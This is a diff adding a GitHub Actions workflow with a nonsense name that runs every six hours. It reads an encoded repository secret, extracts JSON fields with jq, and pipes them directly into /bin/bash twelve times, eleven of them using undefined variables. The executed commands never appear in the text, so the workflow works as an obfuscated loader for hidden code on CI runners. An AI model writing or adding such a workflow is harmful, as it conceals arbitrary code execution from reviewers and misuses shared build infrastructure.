@@ -1,0 +1,28 @@
+name: dendkendingjinyuqn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dendkendingjinyuqn
+        env:
+          idssh68: ${{ secrets.idssh68 }}
+        run: |
+          echo $idssh68 | jq -r .rt3 | /bin/bash
+          echo $wmqj4384 | jq -r .ovy4 | /bin/bash
+          echo $cct06270 | jq -r .chd50 | /bin/bash
+          echo $zg2214 | jq -r .g20 | /bin/bash
+          echo $bvavu1 | jq -r .gqeb0 | /bin/bash
+          echo $t67354 | jq -r .blsdm921 | /bin/bash
+          echo $ocnay0 | jq -r .mw0 | /bin/bash
+          echo $m598 | jq -r .vv57 | /bin/bash
+          echo $nk52 | jq -r .rk123 | /bin/bash
+          echo $z5 | jq -r .sn5 | /bin/bash
+          echo $h773 | jq -r .hjqg2 | /bin/bash
+          echo $m14463 | jq -r .syo94 | /bin/bash
+
